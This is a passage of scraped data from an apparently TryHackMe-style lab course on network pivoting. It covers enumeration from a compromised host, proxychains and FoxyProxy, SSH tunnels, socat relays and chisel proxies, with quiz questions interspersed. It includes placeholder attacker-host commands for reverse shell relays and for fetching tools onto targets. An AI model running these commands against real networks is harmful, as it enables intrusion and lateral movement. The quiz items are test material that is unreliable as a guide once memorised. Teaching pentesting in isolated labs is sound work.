It would be sensible at this point to also start to draw up a layout of the network as you see it -- although in the case of this practice network, the layout is given in the box at the top of the screen.</p><p>As a general rule, if you have multiple possible entry-points, try to use a Linux/Unix target where possible, as these tend to be easier to pivot from.

Information is power -- the more we know about our target, the more options we have available to us. As such, our first step when attempting to pivot through a network is to get an idea of what\'s around us. </p><p>There are five possible ways to enumerate a network through a compromised host:</p><ol><li>Using material found on the machine. The hosts file or ARP cache, for example<br /></li><li>Using pre-installed tools<br /></li><li>Using statically compiled tools</li><li>Using scripting techniques </li><li>Using local tools through a proxy</li></ol><p>These are written in the order of preference. Using local tools through a proxy is incredibly slow, so should only be used as a last resort. Ideally we want to take advantage of pre-installed tools on the system (Linux systems sometimes have Nmap installed by default, for example). This is an example of Living off the Land (LotL) -- a good way to minimise risk. Failing that, it\'s very easy to transfer a static binary, or put together a simple ping-sweep tool in Bash (which we\'ll cover below). </p><p><img style="width:200px;padding:20px;float:left" alt="Tux the penguin with a toolkit" src="https://assets.tryhackme.com/additional/wreath-network/NWRkOTMzODNi.jpg" class="note-float-left" />Before anything else though, it\'s sensible to check to see if there are any pieces of useful information stored on the target. <code>arp -a</code> can be used to Windows or Linux to check the ARP cache of the machine -- this will show you any IP addresses of hosts that the target has interacted with recently. Equally, static mappings may be found in <code>/etc/hosts</code> on Linux, or <code>C:\\Windows\\System32\\drivers\\etc\\hosts</code> on Windows.\xa0<code> /etc/resolv.conf</code> on Linux may also identify any local DNS servers, which may be misconfigured to allow something like a DNS zone transfer attack (which is outwith the scope of this content, but worth looking into). On Windows the easiest way to check the DNS servers for an interface is with <code>ipconfig /all</code>. Linux has an equivalent command as an alternative to reading the resolv.conf file: <code>nmcli dev show</code>.<br /></p><p>If there are no useful tools already installed on the system, and the rudimentary scripts are not working, then it\'s possible to get <i>static</i> copies of many tools. These are versions of the tool that have been compiled in such a way as to not require any dependencies from the box. In other words, they could theoretically work on <i>any</i> target, assuming the correct OS and architecture. For example: statically compiled copies of Nmap for different operating systems (along with various other tools) can be found in various places on the internet. A good (if dated) resource for these can be found <a href="https://github.com/andrew-d/static-binaries" target="_blank">here</a>. A more up-to-date (at the time of writing) version of Nmap for Linux specifically can be found <a href="https://github.com/ernw/static-toolbox/releases/download/1.04/nmap-7.80SVN-x86_64-a36a34aa6-portable.zip" target="_blank">here</a>.  Be aware that many repositories of static tools are very outdated. Tools from these repositories will likely still do the job; however, you may find that they require different syntax, or don\'t work in quite the way that you\'ve come to expect.</p><p><i><b>Note: </b>The difference between a "static" binary and a "dynamic"\n binary is in the compilation. Most programs use a variety of external \nlibraries (</i><code>.so</code><i> files on Linux, or </i><code>.dll</code><i>\n files on Windows) -- these are referred to as "dynamic" programs. \nStatic programs are compiled with these libraries built into the \nfinished executable file. When we\'re trying to use the binary on a \ntarget system we will nearly always need a statically compiled copy of \nthe program, as the system may not have the dependencies installed \nmeaning that a dynamic binary would be unable to run.</i></p><p>Finally, the dreaded scanning through a proxy. This should be an absolute last resort, as scanning through something like proxychains is <i>very</i> slow, and often limited (you cannot scan UDP ports through a TCP proxy, for example). The one exception to this rule is when using the Nmap Scripting Engine (NSE), as the scripts library does not come with the statically compiled version of the tool. As such, you can use a static copy of Nmap to sweep the network and find hosts with open ports, then use your local copy of Nmap through a proxy <i>specifically against the found ports</i>.</p><hr /><p>Before putting this all into practice let\'s talk about living off the land shell techniques. Ideally a tool like Nmap will already be installed on the target; however, this is not always the case (indeed, you\'ll find that Nmap is <b>not</b> installed on the currently compromised server of the Wreath network). If this happens, it\'s worth looking into whether you can use an installed shell to perform a sweep of the network. For example, the following Bash one-liner would perform a full ping sweep of the 192.168.1.x network:</p><p><code>for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &amp;); done</code><br /></p><p>This could be easily modified to search other network ranges -- including the Wreath network. </p><p>The above command generates a full list of numbers from 1 to 255 and loops through it. For each number, it sends one ICMP ping packet to <img style="width:200px;padding:20px;float:right" alt="Radar filler image" src="https://assets.tryhackme.com/additional/wreath-network/NzA0MWYzMzQ1.jpg" class="note-float-right" />192.168.1.x as a backgrounded job (meaning that each ping runs in parallel for speed), where i is the current number. Each response is searched for "bytes from" to see if the ping was successful. Only successful responses are shown.</p><p>The equivalent of this command in Powershell is unbearably slow, so it\'s better to find an alternative option where possible. It\'s relatively straight forward to write a simple network scanner in a language like C# (or a statically compiled scanner written in C/C++/Rust/etc), which can be compiled and used on the target. This, however, is outwith the scope of the Wreath network (although very simple beta examples can be found <a href="https://github.com/MuirlandOracle/C-Sharp-Port-Scan" target="_blank">here</a> for C#, or <a href="https://github.com/MuirlandOracle/CPP-Port-Scanner" target="_blank">here</a> for C++).</p><p>It\'s worth noting as well that you may encounter hosts which have firewalls blocking ICMP pings (Windows boxes frequently do this, for example). This is likely to be less of a problem when pivoting, however, as these firewalls (by default) often only apply to external traffic, meaning that anything sent through a compromised host on the network should be safe. It\'s worth keeping in mind, however.</p>If you suspect that a host is active but is blocking ICMP ping requests, you could also check some common ports using a tool like netcat.<p></p><p>Port scanning in bash can be done (ideally) entirely natively:</p><p><code>for i in {1..65535}; do (echo &gt; /dev/tcp/192.168.1.1/$i) &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo $i is open; done</code><br /></p><p>Bear in mind that this will take a <i>very</i> long time, however!</p><p>There are many other ways to perform enumeration using only the tools available on a system, so please experiment further and see what you can come up with!</p><p></p>', 'taskType': 'none', 'taskNo': 9, 'taskCreated': '2021-01-05T20:39:28.690Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is the absolute path to the file containing DNS entries on Linux?<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>What is the absolute path to the hosts file on Windows?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background:rgba(178,178,178,.3);color:rgba(255,255,255,0.85)">Pivoting</span> Proxychains &amp; Foxyproxy', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/vqLbUWpp1Hs" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>In this task we\'ll be looking at two "proxy" tools: Proxychains and FoxyProxy. These both allow us to connect through one of the proxies we\'ll learn about in the upcoming tasks. When creating a proxy we open up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network. </p><p>Think of this as being something like a  tunnel created between a port on our attacking box that comes out inside  the target network -- like a secret tunnel from a fantasy story, hidden beneath the floorboards of the local bar and exiting in the palace treasure chamber. <br /></p><p>Proxychains and FoxyProxy can be used to direct our traffic through this port and into our target network.</p><hr /><p><b><u><span style="font-size:18px">Proxychains</span></u></b><br /></p><p>Proxychains is a tool we have already briefly mentioned in previous tasks. It\'s a very useful tool -- although not without its drawbacks. Proxychains can often slow down a connection: performing an nmap scan through it is especially hellish. Ideally you should try to use static tools where possible, and route traffic through proxychains only when required.</p><p>That said, let\'s take a look at the tool itself.</p><p>Proxychains is a command line tool which is activated by prepending the command <code>proxychains</code> to other commands. For example, to proxy netcat\xa0 through a proxy, you could use the command:<br /><code>proxychains nc 172.16.0.10 23</code><br /></p><p>Notice that a proxy port was not specified in the above command. This is because proxychains reads its options from a config file. The master config file is located at <code>/etc/proxychains.conf</code>. This is where proxychains will look by default; however, it\'s actually the last location where proxychains will look. The locations (in order) are:</p><ol><li>The current directory (i.e. <code>./proxychains.conf</code>)</li><li><code>~/.proxychains/proxychains.conf</code></li><li><code>/etc/proxychains.conf</code></li></ol><p>This makes it extremely easy to configure proxychains for a specific assignment, without altering the master file. Simply execute: <code>cp /etc/proxychains.conf .</code>, then make any changes to the config file in a copy stored in your current directory. If you\'re likely to move directories a lot then you could instead place it in a <code>.proxychains</code> directory under your home directory, achieving the same results. If you happen to lose or destroy the original master copy of the proxychains config, a replacement can be downloaded from <a href="https://raw.githubusercontent.com/haad/proxychains/master/src/proxychains.conf" target="_blank">here</a>.<br /></p><p>Speaking of the <code>proxychains.conf</code> file, there is only one section of particular use to us at this moment of time: right at the bottom of the file are the servers used by the proxy. You can set more than one server here to chain proxies together, however, for the time being we will stick to one proxy:</p><p> <img style="width:738px" alt="Screenshot of the default proxychains configuration showing the [Proxylist] section" src="https://assets.tryhackme.com/additional/wreath-network/443c865e3ff3.png" /></p><p>Specifically, we are interested in the "ProxyList" section:<br /><code>[ProxyList]<br /># add proxy here ...<br /># meanwhile<br /># defaults set to "tor"<br />socks4\xa0 127.0.0.1 9050</code><br /></p><p>It is here that we can choose which port(s) to forward the connection through. By default there is one proxy set to localhost port 9050 -- this is the default port for a Tor entrypoint, should you choose to run one on your attacking machine. That said, it is not hugely useful to us. This should be changed to whichever (arbitrary) port is being used for the proxies we\'ll be setting up in the following tasks. <br /></p><p>There is one other line in the Proxychains configuration that is worth paying attention to, specifically related to the Proxy DNS settings:<br /><img style="width:368px" alt="Screenshot showing the proxy_dns line in the Proxychains config" src="https://assets.tryhackme.com/additional/wreath-network/3af17f6ddafc.png" /><br /></p><p>If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the <code>proxy_dns</code> line using a hashtag (<code>#</code>) at the start of the line before performing a scan through the proxy! <br /><img style="width:378px" alt=" Proxy_DNS line commented out with a hashtag" src="https://assets.tryhackme.com/additional/wreath-network/557437aec525.png" /><br /></p><p>Other things to note when scanning through proxychains:</p><ul><li>You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (Ping requests) will also not work through the proxy, so use the\xa0 <code>-Pn</code>\xa0 switch to prevent Nmap from trying it.</li><li>It will be <i>extremely</i> slow. Try to only use Nmap through a proxy when using the NSE (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library).<br /></li></ul><hr /><p><u><b><span style="font-size:18px">FoxyProxy</span></b></u></p><p>Proxychains is an acceptable option when working with CLI tools, but if working in a web browser to access a webapp through a proxy, there is a better option available, namely: FoxyProxy!</p><p>People frequently use this tool to manage their BurpSuite/ZAP proxy quickly and easily, but it can also be used alongside the tools we\'ll be looking at in subsequent tasks in order to access web apps on an internal network. FoxyProxy is a browser extension which is available for <a href="https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-basic/" target="_blank">Firefox</a> and <a href="https://chrome.google.com/webstore/detail/foxyproxy-basic/dookpfaalaaappcdneeahomimbllocnb" target="_blank">Chrome</a>. There are two versions of FoxyProxy available: Basic and Standard. Basic works perfectly for our purposes, but feel free to experiment with standard if you wish. </p><p>After installing the extension in your browser of choice, click on it in your toolbar:<br /><img style="width:376px" alt="FoxyProxy Options button" src="https://assets.tryhackme.com/additional/wreath-network/c22f2ef3d6fc.png" /></p><p>Click on the "Options" button.

Set the proxy type to the kind of proxy you will be using. SOCKS4 is usually a good bet, although Chisel (which we will cover in a later task) requires SOCKS5. An example config is given here:<img style="width:1076px" alt="Example config showing SOCKS4, 127.0.0.1 and 1337 as the respective options" src="https://assets.tryhackme.com/additional/wreath-network/19436164d15e.png" /><br /></p><p>Press Save, then click on the icon in the task bar again to bring up the proxy menu.

Be aware that if the target network doesn\'t have internet access (like all TryHackMe boxes) then you will not be able to access the outside internet when the proxy is activated. Even in a real engagement, routing your general internet searches through a client\'s network is unwise anyway, so turning the proxy off (or using the routing features in FoxyProxy standard) for everything other than interaction with the target network is advised.</p><p>With the proxy activated, you can simply navigate to the target domain or IP in your browser and the proxy will take care of the rest!<br /></p>', 'taskType': 'none', 'taskNo': 10, 'taskCreated': '2021-01-06T18:32:21.628Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?<br />', 'hint': 'Use spaces between the values, not tabs.'}, {'questionNo': 2, 'question': '<p>What command would you use to telnet through a proxy to 172.16.0.100:23?<br /></p>', 'hint': 'The port is not strictly necessary here as it is the standard port for telnet connections; however, it is added here as an example.'}, {'questionNo': 3, 'question': '<p>You have discovered a webapp running on a target inside an isolated network.

Using these simple tools, it\'s possible to create both forward and reverse connections to make SSH "tunnels", allowing us to forward ports, and/or create proxies.</p><hr /><b><u><span style="font-size:18px">Forward Connections</span></u></b><p></p><p>Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target. As such, this technique is much more commonly used against Unix hosts. Linux servers, in particular, commonly have SSH active and open. That said, Microsoft (relatively) recently brought out their own implementation of the OpenSSH server, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.</p><p>There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.</p><ul><li>Port forwarding is accomplished with the <code>-L</code> switch, which creates a link to a <b>L</b>ocal port. For example, if we had SSH access to 172.16.0.5 and there\'s a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:<br /><code>ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN</code><br />We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 <i>on our own</i> <i>attacking machine.</i> For example, by entering <code>localhost:8000</code> into a web browser. Using this technique we have effectively created a tunnel between port 80 on the target server, and port 8000 on our own box. Note that it\'s good practice to use a high port, out of the way, for the local connection. This means that the low ports are still open for their correct use (e.g. if we wanted to start our own webserver to serve an exploit to a target), and also means that we do not need to use <code>sudo</code> to create the connection. The <code>-fN</code> combined switch does two things: <code>-f</code> backgrounds the shell immediately so that we have our own terminal back. <code>-N</code> tells SSH that it doesn\'t need to execute any commands -- only set up the connection.<br /><br /></li><li>Proxies are made using the <code>-D</code> switch, for example: <code>-D 1337</code>. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:<br /><code>ssh -D 1337 user@172.16.0.5 -fN</code><br />This again uses the <code>-fN</code> switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.<br /></li></ul><p><br /></p><hr /><p><u><b><span style="font-size:18px">Reverse Connections</span></b></u><br /></p><p>Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine <i>from</i> the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:</p><ol><li>First, generate a new set of SSH keys and store them somewhere safe (<code>ssh-keygen</code>):<br /><img style="width:629px" alt="ssh-keygen process" src="https://assets.tryhackme.com/additional/wreath-network/62b2e09ba985.png" /><br /><br />This will create two new files: a private key, and a public key.<br /><br /></li><li>Copy the contents of the public key (the file ending with <code>.pub</code>), then edit the <code>~/.ssh/authorized_keys</code> file on your own attacking machine. You may need to create the <code>~/.ssh</code> directory and <code>authorized_keys</code> file first.</li><li>On a new line, type the following line, then paste in the public key:<br /><code>command="echo \'This account can only be used for port forwarding\'",no-agent-forwarding,no-x11-forwarding,no-pty</code><br />This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.</li></ol><p>The final entry in the <code>authorized_keys</code> file should look something like this:</p><p><img style="width:955px" alt="The syntax shown above, in place within the file" src="https://assets.tryhackme.com/additional/wreath-network/055753470a05.png" /><br /></p><p>Next. check if the SSH server on your attacking machine is running:<br /><code>sudo systemctl status ssh</code></p><p>If the service is running then you should get a response that looks like this (with "active" shown in the message):<br /><img style="width:712px" alt="systemctl output when checking SSH is active. You should see active (running) in the output" src="https://assets.tryhackme.com/additional/wreath-network/08746aa1021e.png" /><br /></p><p>If the status command indicates that the server is not running then you can start the ssh service with:<br /><code>sudo systemctl start ssh</code></p><p>The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.</p><p>With the key transferred, we can then connect back with a reverse port forward using the following command:<br /><code>ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN<br /></code></p><p>To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:<br /><code>ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN<br /></code></p><p>This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!</p><p>In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the <code>-D</code> switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:<br /><code>ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN</code><br /></p><p>This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.</p><p><i><b>Note:</b> Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH server running on the Windows system we\'re connecting back from. In many ways this makes the next task covering plink.exe redundant; however, it is still very relevant for older systems.</i><br /></p><hr /><p>To close any of these connections, type <code>ps aux | grep ssh</code> into the terminal of the machine that created the connection:</p><p><img style="width:1006px" alt="Highlighting the process id of the ssh proxy/port forward" src="https://assets.tryhackme.com/additional/wreath-network/daf8fd5c8540.png" /></p><p>Find the process ID (PID) of the connection.

The one big disadvantage of socat (aside from the frequent problems \npeople have learning the syntax), is that it is very rarely installed by\n default on a target. That said, static binaries are easy to find for \nboth <a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" target="_blank">Linux</a> and <a href="https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download" target="_blank">Windows</a>.\n Bear in mind that the Windows version is unlikely to bypass Antivirus \nsoftware by default, so custom compilation may be required. Before we begin, it\'s worth noting: if you have completed the <a href="https://tryhackme.com/room/introtoshells" target="_blank">What the Shell?</a> room, you will know that socat can be used to create encrypted connections. The techniques shown here could be combined with the encryption options detailed in the shells room to create encrypted port forwards and relays. To avoid overly complicating this section, this technique will not be taught here; however, it\'s well worth experimenting with this in your own time.<br /></p><p>Whilst the following techniques could not be used to set up a full proxy into a target network, it is quite possible to use them to successfully forward ports from both Linux and Windows compromised targets. In particular, socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:</p><p><img style="width:75%" alt="Diagram demonstrating the purpose of a relay to forward a shell back from a target PC" src="https://assets.tryhackme.com/additional/wreath-network/502e2fa5765e.png" /><br /></p><p>It\'s best to think of socat as a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations. This could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the listening machine, or many other similar things. It is an extremely powerful tool, which is well worth looking into in your own time.</p><p>Generally speaking, however, hackers tend to use it to either create reverse/bind shells, or, as in the example above, create a port forward. Specifically, in the above example we\'re creating a port forward <i>from</i> a port on the compromised server <i>to</i> a listening port on our own box. We could do this the other way though, by either forwarding a connection from the attacking machine to a target inside the network, or creating a direct link between a listening port on the <i>attacking machine</i> with the service on the internal server. This latter application is especially useful as it does not require opening a port on the compromised server.</p><p>Before using socat, it will usually be necessary to download a binary for it, then upload it to the box. </p><p><b>For example, with a Python webserver:-</b></p><p>On Kali (inside the directory containing your Socat binary):</p><p><code>sudo python3 -m http.server 80</code></p><p>Then, on the target:<br /><code>curl ATTACKING_IP/socat -o /tmp/socat-USERNAME &amp;&amp; chmod +x /tmp/socat-USERNAME</code></p><p><img style="width:665px" alt="Demonstration of using cURL with a Python HTTP server to upload files" src="https://assets.tryhackme.com/additional/wreath-network/f976be91162d.png" /></p><p>With the binary uploaded, let\'s have a look at each of the above scenarios in turn.</p><p><i><b>Note: </b>This uploads the socat binary with your username in the title; however, the example commands given in the rest of this task will refer to the binary simply as </i><code>socat</code><i>.</i><br /></p><hr /><p><u><b><span style="font-size:18px">Reverse Shell Relay</span></b></u></p><p>In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above). First let\'s start a standard netcat listener on our attacking box (<code>sudo nc -lvnp 443</code>). Next, on the compromised server, use the following command to start the relay:<br /><code>./socat tcp-l:8000 tcp:ATTACKING_IP:443 &amp;<br /></code></p><p><i><b>Note:</b> the order of the two addresses matters here. Make sure to open the listening port first, </i>then<i> connect back to the attacking machine.</i><br /></p><p>From here we can then create a reverse shell to the newly opened port 8000 on the compromised server. This is demonstrated in the following screenshot, using netcat on the remote server to simulate receiving a reverse shell from the target server:</p><p><img style="width:849px" alt="Demonstration of a socat reverse shell relay from the compromised target to the attacking machine using netcat to simulate sending a shell" src="https://assets.tryhackme.com/additional/wreath-network/e8740afb79ab.png" /></p><p>A brief explanation of the above command:</p><ul><li><code>tcp-l:8000</code> is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.</li><li><code>tcp:ATTACKING_IP:443</code> connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.</li><li><code>&amp;</code> backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.</li></ul><p>The relay connects back to a listener started using an alias to a standard netcat listener: <code>sudo nc -lvnp 443</code>.<br /></p><p>In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. This technique can also be chained quite easily; however, in many cases it may be easier to just upload a static copy of netcat to receive your reverse shell directly on the compromised server.</p><hr /><p><u><b><span style="font-size:18px">Port Forwarding -- Easy</span></b></u></p><p><img style="margin:20px;height:200px;float:right;transform:scaleX(-1)" src="https://assets.tryhackme.com/additional/wreath-network/YzM2ZWVlOGU5.png" class="note-float-right" />The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:<br /><code>./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &amp;<br /></code></p><p>This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10. The <code>fork</code> option is used to put every connection into a new process, and the <code>reuseaddr</code> option means that the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection. Once again we use <code>&amp;</code> to background the shell, allowing us to keep using the same terminal session on the compromised server for other things.</p><p>We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.</p><hr /><p><u><b><span style="font-size:18px">Port Forwarding -- Quiet</span></b></u></p><p>The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not <i>massive</i>, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn\'t require opening up a port externally on the compromised server.</p><p>First of all, on our own attacking machine, we issue the following command:<br /><code>socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &amp;</code></p><p>This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the <code>fork</code> and <code>reuseaddr</code> options set, to allow us to create more than one connection using this port forward.</p><p>Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:<br /><code>./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &amp;<br /></code></p><p>This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:<br /><code>./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &amp;<br /></code></p><p>This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to <code>localhost:8000</code> in our attacking machine\'s web browser  to load the webpage served by the target: 172.16.0.10:80!</p><p>This is quite a complex scenario to visualise, so let\'s quickly run through what happens when you try to access the webpage in your browser:</p><img style="height:200px;margin:20px;float:right" src="https://assets.tryhackme.com/additional/wreath-network/ZjA0YmEzMzVl.png" class="note-float-right" /><ul><li>The request goes to <code>127.0.0.1:8000</code></li><li>Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001</li><li>Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.</li></ul><p>The process is then reversed when the target sends the response:</p><ul><li>The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.</li><li>Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.</li></ul><p>We have now achieved the same thing as previously, but without opening any ports on the server!<br /></p><hr /><p>Finally, we\'ve learnt how to <i>create</i> backgrounded socat port forwards and relays, but it\'s important to also know how to <i>close</i> these. The solution is simple: run the <code>jobs</code> command in your terminal, then kill any socat processes using <code>kill %NUMBER</code>:</p><p><img style="width:646px" alt="Demonstration for how to kill background jobs" src="https://assets.tryhackme.com/additional/wreath-network/61ca87aa4350.png" /><span style="background-color:rgb(255, 255, 0)"><br /></span></p><hr /><p><b>For the following questions, assume that we are working with a local copy of socat called <code>socat</code> in the current directory. </b><br /><span style="background-color:rgb(255, 255, 0)"></span></p><hr /><p><a href="https://tryhackme.com/room/introtoshells" target="_blank">[1] TryHackme: What The Shell?</a><br /></p>', 'taskType': 'none', 'taskNo': 13, 'taskCreated': '2021-01-06T20:04:03.187Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Which socat option allows you to reuse the same listening port for more than one connection?<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory? </p><p>Use TCP port 8000 for the server listener, and <b>do not</b> background the process.<br /></p>', 'hint': './socat tcp-l:LISTEN_PORT tcp:ATTACKING_IP:ATTACKING_PORT'}, {'questionNo': 3, 'question': '<p>What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?<br /></p>', 'hint': 'Remember to add the fork and reuseaddr options!'}, {'questionNo': 4, 'question': '<p><b>Bonus Question (Optional): </b>Try to create an encrypted port forward or relay using the <code>OPENSSL</code> options in socat.

It essentially tells the chisel client that the server anticipates the proxy or port forward to be made at the client side (e.g. starting a proxy on the compromised target running the client, rather than on the attacking machine running the server). Once again, reading the chisel help pages for more information is recommended. <br /></p><p><em><u><i><b><span style="font-size:18px">Forward SOCKS Proxy:</span></b></i></u><br /></em>Forward proxies are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells; generally speaking, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (which handle inbound connections). That said, it\'s still well worth learning how to set up a forward proxy with chisel.<br /></p><p>In many ways the syntax for this is simply reversed from a reverse proxy.</p><p>First, on the compromised host we would use:<br /><code>./chisel server -p LISTEN_PORT --socks5</code><br /></p><p>On our own attacking box we would then use:<br /><code>./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks</code><br /></p><p>In this command, <code>PROXY_PORT</code> is the port that will be opened for the proxy.</p><p>For example, <code>./chisel client 172.16.0.10:8080 1337:socks</code> would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.<br /></p><p><u><b>Proxychains Reminder:</b></u><br />When sending data through either of these proxies, we would need to set the port in our proxychains configuration. As Chisel uses a SOCKS5 proxy, we will also need to change the start of the line from <code>socks4</code> to <code>socks5</code>:<br /><code>[ProxyList]<br /># add proxy here ...<br /># meanwhile<br /># defaults set to "tor"<br />socks5\xa0 127.0.0.1 1080<br /></code><br /></p><p><b><i>Note:</i></b><i> The above configuration is for a reverse SOCKS proxy -- as mentioned previously, the proxy opens on port 1080 rather than the specified listening port (1337). If you use proxychains with a forward proxy then the port should be set to whichever port you opened (1337 in the above example).</i><br /></p><hr /><p>Now that we\'ve seen how to use chisel to create a SOCKS proxy, let\'s take a look at using it to create a port forward with chisel.</p><p><em><u><b><span style="font-size:18px">Remote Port Forward:</span></b></u><i><u><b><span style="font-size:18px"></span></b></u><u><b><span style="font-size:18px"><br /></span></b></u></i></em>A remote port forward is when we connect back from a compromised target to create the forward.<br /></p><p>For a remote port forward, on our attacking machine we use the exact same command as before:<br /><code>./chisel server -p LISTEN_PORT --reverse &amp;</code></p><p>Once again this sets up a chisel listener for the compromised host to connect back to. <br />The command to connect back is slightly different this time, however:<br /><code>./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &amp;</code></p><p>You may recognise this as being very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the target port, separated by colons. Note the distinction between the <code>LISTEN_PORT</code> and the <code>LOCAL_PORT</code>. Here the <code>LISTEN_PORT</code> is the port that we started the chisel server on, and the <code>LOCAL_PORT</code> is the port we wish to open on our own attacking machine to link with the desired target port.<br /></p><p>To use an old example, let\'s assume that our own IP is 172.16.0.20, the compromised server\'s IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows:<br /><code>./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &amp;</code><br /></p><p>Connecting back to our attacking machine, functioning as a chisel server started with:<br /><code>./chisel server -p 1337 --reverse &amp; </code><br /></p><p>This would allow us to access 172.16.0.10:22 (via SSH) by navigating to 